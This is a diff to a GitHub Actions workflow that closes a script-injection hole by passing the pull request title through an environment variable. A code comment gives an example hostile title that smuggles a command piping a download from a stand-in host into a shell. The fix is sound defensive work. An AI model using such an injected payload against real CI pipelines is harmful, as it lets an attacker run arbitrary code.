@@ -16,8 +16,11 @@ jobs:
           fetch-depth: 0
 
       - name: Validate PR title
+        # Pass the title through env: interpolating it into the script lets a PR
+        # title like `x"; curl evil.sh | sh; "` run arbitrary commands.
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
         run: |
-          PR_TITLE="${{ github.event.pull_request.title }}"
           PATTERN="^(feat|fix|docs|style|refactor|perf|test|chore)(\(.+\))?: .+"
 
           if [[ ! "$PR_TITLE" =~ $PATTERN ]]; then
